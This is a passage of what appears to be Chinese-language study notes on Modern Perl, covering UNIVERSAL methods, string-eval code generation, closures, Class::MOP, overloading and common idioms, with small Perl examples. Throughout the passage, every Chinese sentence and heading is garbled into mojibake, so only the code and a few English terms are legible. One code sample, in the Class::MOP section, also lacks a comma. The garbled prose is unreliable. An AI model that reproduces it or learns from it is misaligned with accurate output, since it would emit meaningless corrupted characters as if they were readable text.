æ–¹æ³•"></a><code>isa()</code> æ–¹æ³•</h3><p><code>isa()</code> æ–¹æ³•æ¥å—åŒ…å«<mark>ç±»åæˆ–å†…ç½®ç±»å‹åç§°</mark>çš„å­—ç¬¦ä¸². å¯ä»¥å°†å…¶ä½œä¸ºç±»æ–¹æ³•è°ƒç”¨æˆ–ç”¨ä½œå¯¹è±¡ä¸Šçš„å®ä¾‹æ–¹æ³•.</p><p>å¦‚æœç±»æˆ–å¯¹è±¡ä»ç»™å‡ºçš„ç±»ä¸­è¡ç”Ÿè€Œæ¥, æˆ–è€…å¯¹è±¡æœ¬èº«æ˜¯ç»™ç±»å‹ç» <code>bless</code> çš„å¼•ç”¨, åˆ™æ­¤æ–¹æ³•<mark>è¿”å›çœŸ</mark>.</p><p>(å†…ç½®ç±»å‹æœ‰ <code>SCALAR</code>, <code>ARRAY</code>, <code>HASH</code>, <code>Regexp</code>, <code>IO</code>, <code>CODE</code>):<br>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> $pepper-&gt;isa( <span class="hljs-string">&#x27;Dolphin&#x27;</span> );<br><span class="hljs-keyword">say</span> $pepper-&gt;isa( <span class="hljs-string">&#x27;SCALAR&#x27;</span> );<br></code></pre></td></tr></table></figure><p>å¯åœ¨è‡ªå·±çš„ç±»ä¸­è¦†ç›– <code>isa()</code></p><h3 id="can-æ–¹æ³•"><a href="#can-æ–¹æ³•" class="headerlink" title="can()  æ–¹æ³•"></a><code>can()</code>  æ–¹æ³•</h3><p><code>can()</code> æ–¹æ³•æ¥å—åŒ…å« <mark>æ–¹æ³•å</mark> çš„å­—ç¬¦ä¸². å¦‚æœæ–¹æ³•å­˜åœ¨, åˆ™<mark>è¿”å›</mark>æŒ‡å‘å®ç°è¯¥æ–¹æ³•çš„<mark>å‡½æ•°å¼•ç”¨</mark>, å¦åˆ™è¿”å›å‡.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">my</span> $meth = SpiderMonkey-&gt;can(<span class="hljs-string">&#x27; screech &#x27;</span>)) &#123; ... &#125;<br></code></pre></td></tr></table></figure><h3 id="VERSION-æ–¹æ³•"><a href="#VERSION-æ–¹æ³•" class="headerlink" title="VERSION() æ–¹æ³•"></a><code>VERSION()</code> æ–¹æ³•</h3><p><code>VERSION()</code> æ–¹æ³•å¯¹æ‰€æœ‰åŒ…, ç±»å’Œå¯¹è±¡éƒ½æ˜¯å¯ç”¨çš„. å®ƒè¿”å›åˆé€‚åŒ…æˆ–ç±»ä¸­ <code>$VERSION</code> å˜é‡å€¼. </p><p>å®ƒæ¥å—ä¸€ä¸ªç‰ˆæœ¬å·ä½œä¸ºå¯é€‰å‚æ•°, å½“è¯¥å‚æ•°å¤§äº <code>$VERSION</code> å€¼æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Carp;<br><br><span class="hljs-keyword">say</span> Carp-&gt;VERSION();<br></code></pre></td></tr></table></figure><h3 id="DOES-æ–¹æ³•"><a href="#DOES-æ–¹æ³•" class="headerlink" title="DOES() æ–¹æ³•"></a><code>DOES()</code> æ–¹æ³•</h3><p><code>DOES()</code> æ˜¯ Perl 5.10.0 æ–°åŠ çš„, å®ƒçš„å­˜åœ¨æ”¯æŒäº†ç¨‹åºä¸­<mark>å¯¹è§’è‰²çš„ä½¿ç”¨</mark>.</p><p>å‘å…¶ä¼ é€’è°ƒç”¨ç‰©å’Œè§’è‰²åç§°, æ­¤æ–¹æ³•ä¼šåœ¨åˆé€‚çš„ç±»é¥°æ¼”æ­¤è§’è‰²æ—¶è¿”å›çœŸ.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> Cappuchin-&gt;DOES( <span class="hljs-string">&#x27;Monkey&#x27;</span> );<br></code></pre></td></tr></table></figure><h3 id="æ‰©å±•-UNIVERSAL"><a href="#æ‰©å±•-UNIVERSAL" class="headerlink" title="æ‰©å±• UNIVERSAL"></a>æ‰©å±• UNIVERSAL</h3><p>å¶å°”å¯ä»¥åœ¨è°ƒè¯•æˆ–ä¿®å¤ä¸æ­£ç¡®çš„é»˜è®¤è¡Œä¸ºæ—¶æ‰©å±• <code>UNIVERSAL</code>ã€‚</p><h2 id="ä»£ç ç”Ÿæˆ"><a href="#ä»£ç ç”Ÿæˆ" class="headerlink" title="ä»£ç ç”Ÿæˆ"></a>ä»£ç ç”Ÿæˆ</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>ç”Ÿæˆä»£ç æœ€ç®€å•çš„æŠ€å·§æ˜¯åˆ›å»ºä¸€ä¸ªåŒ…å«åˆæ³• Perl ä»£ç ç‰‡æ®µçš„å­—ç¬¦ä¸²å¹¶é€šè¿‡ <code>eval</code> å­—ç¬¦ä¸²æ“ä½œç¬¦ç¼–è¯‘.</p><p>ä¸åƒæ•è·å¼‚å¸¸çš„ <code>eval</code> ä»£ç å—æ“ä½œç¬¦, <code>eval</code> å­—ç¬¦ä¸²åœ¨å½“å‰ä½œç”¨åŸŸå†…ç¼–è¯‘å…¶ä¸­å†…å®¹, åŒ…æ‹¬å½“å‰åŒ…å’Œè¯æ³•ç»‘å®š.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">eval</span> &#123; <span class="hljs-keyword">require</span> Monkey::Tracer &#125; <br>    <span class="hljs-keyword">or</span> <span class="hljs-keyword">eval</span> <span class="hljs-string">&#x27;sub Monkey::Tracer::log &#123;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨å¤šè¡Œå­—ç¬¦ä¸²çš„è¯­æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">generate_accessors</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> ($methname, $attrname) = @_;<br><br>    <span class="hljs-keyword">eval</span> &lt;&lt;<span class="hljs-string">&quot;END_ACCESSOR&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">get_</span>$<span class="hljs-title">methname</span> </span>&#123;<br>        <span class="hljs-keyword">my</span> \$self = <span class="hljs-keyword">shift</span>;<br><br>        <span class="hljs-keyword">return</span> \$self-&gt;&#123;$attrname&#125;;<br>    &#125;<br>END_ACCESSOR<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„åæ–œæ .</p><h3 id="å‚æ•°é—­åŒ…"><a href="#å‚æ•°é—­åŒ…" class="headerlink" title="å‚æ•°é—­åŒ…"></a>å‚æ•°é—­åŒ…</h3><p>è¿™é‡Œå®é™…ä¸Šå°±æ˜¯ç”¨å‡½æ•°å¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">generate_accessors</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $attrname = <span class="hljs-keyword">shift</span>;<br><br>    <span class="hljs-keyword">my</span> $getter = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>        <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>        <span class="hljs-keyword">return</span> $self-&gt;&#123;$attrname&#125;;<br>    &#125;;<br><br>    <span class="hljs-keyword">my</span> $setter = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>        <span class="hljs-keyword">my</span> ($self, $value) = @_;<br><br>        $self-&gt;&#123;$attrname&#125; = $value;<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> $getter, $setter;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç¬¦å·è¡¨å®‰è£…:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">my</span> ($getter, $setter) = generate_accessors( <span class="hljs-string">&#x27;homecourt&#x27;</span> );<br><br>    <span class="hljs-keyword">no</span> strict <span class="hljs-string">&#x27;refs&#x27;</span>;<br>    *&#123; <span class="hljs-string">&#x27;get_homecourt&#x27;</span> &#125; = $getter;<br>    *&#123; <span class="hljs-string">&#x27;set_homecourt&#x27;</span> &#125; = $setter;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç¼–è¯‘å™¨æ“æ§"><a href="#ç¼–è¯‘å™¨æ“æ§" class="headerlink" title="ç¼–è¯‘å™¨æ“æ§"></a>ç¼–è¯‘å™¨æ“æ§</h3><p>ä¸åŒäºæ˜¾å¼ç¼–å†™çš„ä»£ç , é€šè¿‡ <code>eval</code> å­—ç¬¦ä¸²ç”Ÿæˆçš„ä»£ç äºè¿è¡Œæ—¶ç”Ÿæˆ.</p><h2 id="Class-MOP"><a href="#Class-MOP" class="headerlink" title="Class::MOP"></a>Class::MOP</h2><p><code>Class::MOP</code> æ˜¯ <code>Moose</code> çš„æ”¯æŸ±åº“, å®ƒæä¾›äº† <mark>å…ƒå¯¹è±¡åè®® (Meta Object Protocol)</mark>.</p><p>åˆ›å»ºç±»:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Class::MOP;<br><br><span class="hljs-keyword">my</span> $class = Class::MOP::Class-&gt;create( <span class="hljs-string">&#x27;Monkey::Wrench&#x27;</span> );<br></code></pre></td></tr></table></figure><p>åˆ›å»ºæ—¶æ·»åŠ å±æ€§å’Œæ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Class::MOP;<br><br><span class="hljs-keyword">my</span> $class = Class::MOP::Class-&gt;create(<br>    <span class="hljs-string">&#x27;Monkey::Wrench&#x27;</span> =&gt; (<br>        <span class="hljs-string">attributes =&gt;</span> [<br>            Class::MOP::Attribute-&gt;new(<span class="hljs-string">&#x27;$material&#x27;</span>),<br>            Class::MOP::Attribute-&gt;new(<span class="hljs-string">&#x27;$color&#x27;</span>),<br>        ]<br>        <span class="hljs-string">methods =&gt;</span> &#123;<br>            <span class="hljs-string">tighten =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; ... &#125;,<br>            <span class="hljs-string">loosen  =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; ... &#125;,<br>        &#125;<br>    ),<br>);<br></code></pre></td></tr></table></figure><p>åˆ›å»ºåæ·»åŠ :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">$class-&gt;add_attribute( <span class="hljs-string">experience =&gt;</span> Class::MOP::Attribute-&gt;new(<span class="hljs-string">&#x27;$xp&#x27;</span>));<br>$class-&gt;add_method( <span class="hljs-string">bash_zombie =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; ... &#125;);<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @attrs = $class-&gt;get_all_attributes();<br><span class="hljs-keyword">my</span> @meths = $class-&gt;get_all_methods();<br></code></pre></td></tr></table></figure><h2 id="é‡è½½"><a href="#é‡è½½" class="headerlink" title="é‡è½½"></a>é‡è½½</h2><p>å‡ ä¹å¯ä»¥é‡è½½ä»»ä½•çš„å¯¹è±¡æ“ä½œ.</p><h3 id="é‡è½½å¸¸è§æ“ä½œ"><a href="#é‡è½½å¸¸è§æ“ä½œ" class="headerlink" title="é‡è½½å¸¸è§æ“ä½œ"></a>é‡è½½å¸¸è§æ“ä½œ</h3><ul><li>å­—ç¬¦ä¸²åŒ–</li><li>æ•°å€¼åŒ–</li><li>å¸ƒå°”åŒ–</li></ul><p><code>overload</code> ç¼–è¯‘å‘½ä»¤å…è®¸ä½ å°†å‡½æ•°å’Œå¯é‡è½½æ“ä½œå…³è”èµ·æ¥:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Null;<br><br><span class="hljs-keyword">use</span> overload <span class="hljs-string">&#x27;bool&#x27;</span> =&gt; <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-number">0</span> &#125;;<br></code></pre></td></tr></table></figure><p>å³åœ¨æ‰€æœ‰å¸ƒå°”ä¸Šä¸‹æ–‡ä¸­, æ­¤ç±»çš„æ‰€æœ‰å®ä¾‹æ±‚å€¼å¾—å‡.</p><p><code>overload</code> ç¼–è¯‘å‘½ä»¤çš„å‚æ•°æ˜¯ä¸€ä¸ªé”®å€¼å¯¹, é”®æè¿°äº†é‡è½½çš„ç±»å‹è€Œå€¼åˆ™æ˜¯æ›¿ä»£ Perl é»˜è®¤è¡Œä¸ºçš„å‡½æ•°å¼•ç”¨.</p><p>å¯è§ <code>perldoc overload</code></p><h3 id="é‡è½½å’Œç»§æ‰¿"><a href="#é‡è½½å’Œç»§æ‰¿" class="headerlink" title="é‡è½½å’Œç»§æ‰¿"></a>é‡è½½å’Œç»§æ‰¿</h3><h3 id="é‡è½½çš„ç”¨é€”"><a href="#é‡è½½çš„ç”¨é€”" class="headerlink" title="é‡è½½çš„ç”¨é€”"></a>é‡è½½çš„ç”¨é€”</h3><p>å¯è§ <code>IO::All</code> æ¨¡å—</p><h2 id="Taint"><a href="#Taint" class="headerlink" title="Taint"></a>Taint</h2><p>æ±¡ç‚¹æ¨¡å¼, å…·ä½“è§ä¹¦.</p><h1 id="è¯­æ³•ä¹‹å¤–çš„-Perl"><a href="#è¯­æ³•ä¹‹å¤–çš„-Perl" class="headerlink" title="è¯­æ³•ä¹‹å¤–çš„ Perl"></a>è¯­æ³•ä¹‹å¤–çš„ Perl</h1><h2 id="æƒ¯ç”¨è¯­"><a href="#æƒ¯ç”¨è¯­" class="headerlink" title="æƒ¯ç”¨è¯­"></a>æƒ¯ç”¨è¯­</h2><h3 id="å°†å¯¹è±¡ç”¨ä½œ-self"><a href="#å°†å¯¹è±¡ç”¨ä½œ-self" class="headerlink" title="å°†å¯¹è±¡ç”¨ä½œ $self"></a>å°†å¯¹è±¡ç”¨ä½œ <code>$self</code></h3><p>Perl 5 æƒ¯ç”¨è¯­å°† <code>$class</code> ç”¨ä½œç±»åè€Œå°† <code>$self</code> ç”¨ä½œå®ä¾‹æ–¹æ³•çš„è°ƒç”¨è€….</p><h3 id="å…·åå‚æ•°"><a href="#å…·åå‚æ•°" class="headerlink" title="å…·åå‚æ•°"></a>å…·åå‚æ•°</h3><p>å°±æ˜¯ä¼ é€’å“ˆå¸Œæˆ–å“ˆå¸Œå¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl">make_ice_cream_sundae(<br>    <span class="hljs-string">whipped_cream =&gt;</span> <span class="hljs-number">1</span>,<br>    <span class="hljs-string">sprinkles     =&gt;</span> <span class="hljs-number">1</span>,<br>    <span class="hljs-string">banana        =&gt;</span> <span class="hljs-number">0</span>,<br>    <span class="hljs-string">ice_cream     =&gt;</span> <span class="hljs-string">&#x27;mint chocolate chip&#x27;</span>,<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">make_ice_cream_sundae</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> %args = @_;<br><br>    <span class="hljs-keyword">my</span> $ice_cream = get_ice_cream( $args<span class="hljs-string">&#123;ice_cream&#125;</span> );<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å’Œ <code>import()</code> é…åˆ, å°†å¤šä½™çš„å‚æ•°å¸å…¥å“ˆå¸Œ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">import</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> ($class, %args) = @_;<br>    <span class="hljs-keyword">my</span> $calling_package = <span class="hljs-keyword">caller</span>();<br><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Schwartzian-è½¬æ¢"><a href="#Schwartzian-è½¬æ¢" class="headerlink" title="Schwartzian è½¬æ¢"></a>Schwartzian è½¬æ¢</h3><p>ä» Lisp è¯­è¨€å€Ÿé‰´è€Œæ¥. å…¶å°±æ˜¯ <code>map-sort-map</code> çš„ç»“æ„, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-keyword">for</span> <br>    <span class="hljs-keyword">map</span>  &#123; <span class="hljs-string">&quot; $_-&gt;[1], ext. $_-&gt;[0]&quot;</span>         &#125;<br>    <span class="hljs-keyword">sort</span> &#123;   $a-&gt;[<span class="hljs-number">1</span>] cmp   $b-&gt;[<span class="hljs-number">1</span>]          &#125;<br>    <span class="hljs-keyword">map</span>  &#123; [ $_      =&gt;    $extension&#123;$_&#125; ] &#125;<br>        <span class="hljs-keyword">keys</span> %extensions;<br></code></pre></td></tr></table></figure><h3 id="ç®€æ˜“æ–‡ä»¶å¸å…¥"><a href="#ç®€æ˜“æ–‡ä»¶å¸å…¥" class="headerlink" title="ç®€æ˜“æ–‡ä»¶å¸å…¥"></a>ç®€æ˜“æ–‡ä»¶å¸å…¥</h3><p>ç”¨å•ä¸ªè¡¨è¾¾å¼å°†æ–‡ä»¶å¸å…¥æŸä¸ªæ ‡é‡ä¸­:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $file = <span class="hljs-keyword">do</span> &#123; <span class="hljs-keyword">local</span> $/ = &lt;$fh&gt;&#125;;<br><br><span class="hljs-comment"># or</span><br><br><span class="hljs-keyword">my</span> $file = <span class="hljs-keyword">do</span> &#123; <span class="hljs-keyword">local</span> $/; &lt;$fh&gt;&#125;;<br></code></pre></td></tr></table></figure><p><code>$/</code> æ˜¯è¾“å…¥è®°å½•åˆ†éš”ç¬¦. ç”¨ <code>local</code> å°†å…¶å±€éƒ¨åŒ–, å³å°†å…¶å€¼è®¾ä¸º <code>undef</code>, ç”±äº <code>local</code> æ“ä½œåœ¨èµ‹å€¼ä¹‹å‰, åˆ†éš”ç¬¦æœªå®šä¹‰, Perl å°±å°†æ–‡ä»¶å†…å®¹å…¨éƒ¨è¯»å…¥.</p><h3 id="æ§åˆ¶ç¨‹åºæ‰§è¡Œ"><a href="#æ§åˆ¶ç¨‹åºæ‰§è¡Œ" class="headerlink" title="æ§åˆ¶ç¨‹åºæ‰§è¡Œ"></a>æ§åˆ¶ç¨‹åºæ‰§è¡Œ</h3><p>äº†è§£ Perl å¦‚ä½•å¼€å§‹æ‰§è¡Œä¸€æ®µä»£ç , ä½¿ç”¨ <code>caller</code> å‡½æ•°.</p><p><code>caller</code> çš„å•ä¸ªå¯é€‰å‚æ•°å°±æ˜¯è¦æŠ¥å‘Šçš„è°ƒç”¨å¸§çš„æ•°ç›®. ( <mark>è°ƒç”¨å¸§ (call frame)</mark> å°±æ˜¯ä»£è¡¨ä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨çš„è–„è®°ä¿¡æ¯ )</p><p>å¯ä»¥ç”¨ <code>caller(0)</code> å¾—åˆ°å½“å‰è°ƒç”¨å¸§çš„ä¿¡æ¯.</p><h3 id="å¤„ç†-Main-å‡½æ•°"><a href="#å¤„ç†-Main-å‡½æ•°" class="headerlink" title="å¤„ç† Main å‡½æ•°"></a>å¤„ç† <code>Main</code> å‡½æ•°</h3><p>ç”¨ä¸€ä¸ªç®€å•çš„å‡½æ•°, <code>main()</code>, æ¥åŒ…è£…ç¨‹åºçš„ä¸»è¦ä»£ç . å°†æ‰€æœ‰ä½ ä¸éœ€è¦çš„å˜é‡å°è£…ä¸ºçœŸæ­£çš„å…¨å±€å˜é‡.</p><p>ç„¶åå°†:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">main();<br></code></pre></td></tr></table></figure><p>å†™åœ¨å¼€å¤´.</p><h3 id="åç¼€å‚æ•°éªŒè¯"><a href="#åç¼€å‚æ•°éªŒè¯" class="headerlink" title="åç¼€å‚æ•°éªŒè¯"></a>åç¼€å‚æ•°éªŒè¯</h3><p>å¯ä»¥ä½¿ç”¨ <code>Params::Validate</code> å’Œ <code>MooseX::Params::Validate</code> ç­‰ CPAN æ¨¡å—æ¥éªŒè¯å‡½æ•°æ¥å—çš„å‚æ•°æ˜¯å¦æ­£ç¡®.</p><p>ä¸ä½¿ç”¨æ¨¡å—çš„æ–¹å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">groom_monkeys</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (@_ != <span class="hljs-number">2</span>) &#123;<br>        croak <span class="hljs-string">&#x27;Monkey grooming requires two monkeys!&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡ŒéªŒè¯çš„æ˜¯å‚æ•°ä¸ªæ•°.</p><p>ä¹Ÿå¯å†™æˆ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">croak <span class="hljs-string">&#x27;Monkey grooming requires two monkeys!&#x27;</span> <span class="hljs-keyword">unless</span> @_ == <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><h3 id="Regex-En-Passant"><a href="#Regex-En-Passant" class="headerlink" title="Regex En Passant"></a>Regex En Passant</h3><p>å‡è®¾æœ‰ä¸€ä¸ªå…¨åå¹¶ä¸”æƒ³è¦æå–åå­—éƒ¨åˆ†:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> ($first_name) = $name =~ <span class="hljs-regexp">/($first_name_rx)/</span>;<br></code></pre></td></tr></table></figure><p><code>$first_name_rx</code> æ˜¯ä¸€ä¸ªé¢„ç¼–è¯‘çš„æ­£åˆ™è¡¨è¾¾å¼.</p><p>åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­, ä¸€ä¸ªæˆåŠŸæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…è¿”å›ç”±æ‰€æœ‰æ•è·ç»„æˆçš„åˆ—è¡¨, è¿™é‡Œå°†ç¬¬ä¸€ä¸ªå…ƒç´ èµ‹å€¼ç»™ <code>$first_name</code></p><h2 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h2><p><mark>è¶…çº§å…¨å±€å˜é‡</mark> , ä¸ä»…ä»…å±€é™äºä»»ä½•ç‰¹å®šçš„åŒ….</p><p>ä¸¤ä¸ªç¼ºç‚¹:</p><ul><li>ä»»ä½•ç›´æ¥æˆ–é—´æ¥çš„ä¿®æ”¹å°±èƒ½å½±å“åˆ°ç¨‹åºçš„å…¶ä½™éƒ¨åˆ†</li><li>è¿‡äºç²¾ç‚¼</li></ul><h3 id="ç®¡ç†è¶…çº§å…¨å±€å˜é‡"><a href="#ç®¡ç†è¶…çº§å…¨å±€å˜é‡" class="headerlink" title="ç®¡ç†è¶…çº§å…¨å±€å˜é‡"></a>ç®¡ç†è¶…çº§å…¨å±€å˜é‡</h3><p>æœ€ä½³é€”å¾„æ˜¯é¿å…ä½¿ç”¨.</p><p>å½“å¿…é¡»è¦ä½¿ç”¨æ—¶, åœ¨å°½å¯èƒ½å°çš„ä½œç”¨åŸŸå†…ä½¿ç”¨ <code>local</code> æ¥çº¦åˆ¶æ”¹åŠ¨.</p><p>å¦‚æ–‡ä»¶å¸å…¥:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $file = <span class="hljs-keyword">do</span> &#123; <span class="hljs-keyword">local</span> $/ = &lt;$fh&gt; &#125;;<br></code></pre></td></tr></table></figure><p>ç«‹åˆ»å¤åˆ¶ <code>$@</code> æ¥é¢„ç•™å®ƒçš„å†…å®¹.</p><h3 id="è‹±è¯­åç§°"><a href="#è‹±è¯­åç§°" class="headerlink" title="è‹±è¯­åç§°"></a>è‹±è¯­åç§°</h3><p><code>English</code> æ ¸å¿ƒæ¨¡å—ä¸ºè¿‡åº¦ä½¿ç”¨æ ‡ç‚¹çš„è¶…çº§å…¨å±€å˜é‡æä¾›äº†è¯¦ç»†çš„åç§°.</p><p>å¯¼å…¥åˆ°åç§°ç©ºé—´:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> English <span class="hljs-string">&#x27;-no_match_vars&#x27;</span>;<br></code></pre></td></tr></table></figure><p>åç§°è®°å½•åœ¨ <code>perldoc perlvar</code> ä¸­.</p><p>ä¸‰ä¸ªæ­£åˆ™è¡¨è¾¾å¼ç›¸å…³çš„è¶…çº§å…¨å±€å˜é‡ <code>$&amp;</code>, <code>$åå¼•å·</code> å’Œ <code>$&#39;</code> ä¼šé™ä½ç¨‹åºå†…æ‰€æœ‰æ­£åˆ™è¡¨è¾¾å¼çš„æ€§èƒ½. ç°ä»£åŒ– Perl ç¨‹åºç”¨ <code>@-</code> ä»£æ›¿å‰ä¸‰ä¸ªå˜é‡.</p><h3 id="å¸¸ç”¨è¶…çº§å…¨å±€å˜é‡"><a href="#å¸¸ç”¨è¶…çº§å…¨å±€å˜é‡" class="headerlink" title="å¸¸ç”¨è¶…çº§å…¨å±€å˜é‡"></a>å¸¸ç”¨è¶…çº§å…¨å±€å˜é‡</h3><p><img src="/../img/perl_super_global_var.png"></p><h1 id="è¦é¿å…ä»€ä¹ˆ"><a href="#è¦é¿å…ä»€ä¹ˆ" class="headerlink" title="è¦é¿å…ä»€ä¹ˆ"></a>è¦é¿å…ä»€ä¹ˆ</h1><h2 id="è£¸å­—"><a href="#è£¸å­—" class="headerlink" title="è£¸å­—"></a>è£¸å­—</h2><p><mark>è£¸å­—</mark> æ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦, å®ƒæ²¡æœ‰å°è®°æˆ–å…¶ä»–ç”¨äºè¯´æ˜å…¶è¯­æ³•åŠŸèƒ½çš„é™„åŠ æ¶ˆæ­§æ¡ä»¶.</p><h3 id="è£¸å­—çš„æ­£å½“ä½¿ç”¨"><a href="#è£¸å­—çš„æ­£å½“ä½¿ç”¨" class="headerlink" title="è£¸å­—çš„æ­£å½“ä½¿ç”¨"></a>è£¸å­—çš„æ­£å½“ä½¿ç”¨</h3><p>Perl 5 ä¸­çš„å“ˆå¸Œé”®æ˜¯è£¸å­—, æœ‰æ—¶è¶³å¤Ÿç”¨, 